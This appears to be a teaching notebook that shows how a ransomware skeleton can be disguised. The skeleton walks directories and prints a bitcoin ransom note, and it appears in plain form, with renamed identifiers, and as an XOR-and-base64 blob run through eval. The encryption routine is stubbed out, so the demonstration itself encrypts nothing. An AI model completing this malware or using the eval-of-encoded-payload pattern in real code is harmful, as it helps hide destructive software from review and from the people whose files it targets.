# %% [markdown]
# # Example Malware (Unobfuscated)

# %%
import os

RANSOM_NOTE = "Your files have been encryped, send £300 in bitcoin to retrieve them"

def encrypt_file(file):
    # Encryption logic (ommitted) 
    pass


def walk_and_encrypt(path):
    files = os.listdir(path)

    for file in files:
        file_path = os.path.join(path, file)
        if os.path.isdir(file_path):
            walk_and_encrypt(file_path)
        else:
            encrypt_file(file)


walk_and_encrypt("../")
print(RANSOM_NOTE)

# %% [markdown]
# # Symbolic Obfuscation

# %%
from os import listdir as xl0YPXBw3z
from os.path import isdir as R1gkloCNFN
from os.path import join as YOiDORLN5G

Ri42V0SdN7 = ""

def fA2KURq8q(file):
    pass

def BkJlYLket4(IXM1jPJdnk):
    g5a0RdpA8p = xl0YPXBw3z(IXM1jPJdnk)

    for gRe9YEaSBC in g5a0RdpA8p:
        uzCw2l4e0x = YOiDORLN5G(IXM1jPJdnk, gRe9YEaSBC)
        if R1gkloCNFN(uzCw2l4e0x):
            BkJlYLket4(uzCw2l4e0x)
        else:
            fA2KURq8q(gRe9YEaSBC)

if __name__ == "__main__":
    BkJlYLket4("../")
    print(Ri42V0SdN7)

# %% [markdown]
# # Cryptographic Obfuscation

# %%
import base64

P = ' \x16p6#r\x0bq\x08\x06x;\x02&1\x12\x10\x14t\x15\x15qp\'\x15*x\x14\x13\x12\x00x\x08\x02\x0b\x1b#r\x178\x08\x06\x1b1#\x06\x17;\x08\x06))%,\x14&\x18,\x17-#(\x03-#,\x0f8$\x19\x03-\x1b\x026&"s\x174\x1b\x02\x05\x02.;\x0c6\x0c\x02\x031#(\x03( \x19\x13+#s-4\x08\t\x137\x08\t\x0b-%\t\x0b1\x1b\x19\x1b-\x08\t\x13.\x1b\x16q(\x02&1*\x1b\x16\x18&\x1b\x16t+"/-6%\x07x, \x169-\n\x06\x1b1#\x06\x141\x0e&.&\x08\x02\x00&\x088\x03\x07#,\x0f8$\x19\x03q \x16x4\x08\x0697\x1bs-+\x02(\x00&\x08\x02\x036\x18\x19\x0f;\x02&.\n\x1b\x06\x17,\x08\t%)#\x065\'\x18\x16t*\x19s\x174\x18r\x0bt"\t\x10."\x06\x07q \x02*w\x02(\x00&\x08\x02\x03, \x169-"8\x00x\x08\x06x;\r,91"r\x13* \x19\x08."\x06\x07q \x02*\n\x02(\x00&\x08\x02\x03,#r\x08&\x1b,-2\x1b\x12\x031#(\x03, \x169-";.\n\x08\x02\x00&\x08\x02\x00&\x08\x02\x03, \x169-\x19r\x03)%\x06&&\x11\x12\x037"8t6\x18\x19\x13.\r,17 \x16u."\x06\x07q \x026&\x1b,-2\x1b\x12*\n\x08\x02\x00&\x08\x02\x00&\x08\x02\x031\x1b(\x037"8t6\x18\x19\x13.\r,-;\x1b\x06-8\n\x06\x1b1#\x06\x17\'"\x06\x07q \x02*w\x02(\x00&\x08\x02\x00&\x08\x02\x00&\x08\x02\x00&\x08\t%)#\x065\'\x18\x16t*\x19s\x174\x18r\x0bt"\t\x10.\x1b,-2\x1b\x17x6\x18\x19\x13.\n\x10.&\x08\x02\x00&\x08\x02\x00&\x08\x06\x172"s\x14w\x02(\x00&\x08\x02\x00&\x08\x02\x00&\x08\x02\x00&\x08\x06\x174\x18r\x0bt"\t\x13\'\x1b,-2\x1b\x12), \x169-\n\x10.\n%s\x072 px)#,\x13\'\x1b\x16t+"/-6%\x02&(\r(u7\x08(*\n"\t\x0b1#/\x10.\x14*\x07\x0e\x14qx\x0f\x19qt\x11\x17\x04\x141'

decoded_payload = "".join([chr(ord(p_i) ^ ord("A")) for p_i in P])
eval(base64.b64decode(decoded_payload).decode("utf-8"))
